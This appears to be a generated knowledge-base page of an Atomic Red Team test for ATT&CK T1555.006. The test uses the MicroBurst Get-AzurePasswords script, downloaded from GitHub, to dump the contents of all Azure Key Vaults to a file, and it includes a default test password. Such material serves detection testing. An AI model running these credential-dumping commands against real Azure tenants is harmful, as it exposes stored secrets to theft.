---
atomic_guid: "1b83cddb-eaa7-45aa-98a5-85fb0a8807ea"
title: "Azure - Dump All Azure Key Vaults with Microburst"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.006"
attack_technique_name: "Credentials from Password Stores: Cloud Secrets Management Stores"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.006/T1555.006.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "1b83cddb-eaa7-45aa-98a5-85fb0a8807ea"
  - "Azure - Dump All Azure Key Vaults with Microburst"
platforms:
  - "iaas:azure"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores#^t1555006-cloud-secrets-management-stores|T1555.006: Cloud Secrets Management Stores]]

## Input Arguments

### output_file

- description: File to dump results to
- type: string
- default: $env:temp\T1528Test1.txt

### password

- description: Azure AD password
- type: string
- default: T1082Az

### subscription_id

- description: Azure subscription id to search
- type: string

### username

- description: Azure AD username
- type: string

## Dependencies

The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPayloads.

### Prerequisite Check

```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"){exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
```

The Azure RM module must be installed.

### Prerequisite Check

```powershell
try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name AzureRM -Force -allowclobber
```

The Azure module must be installed.

### Prerequisite Check

```powershell
try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
```

### Get Prerequisite

```powershell
Install-Module -Name Azure -Force -allowclobber
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
Connect-AzureRmAccount -Credential $Credential
Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
cat #{output_file}
```

### Cleanup

```powershell
remove-item #{output_file} -force -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.006/T1555.006.yaml)
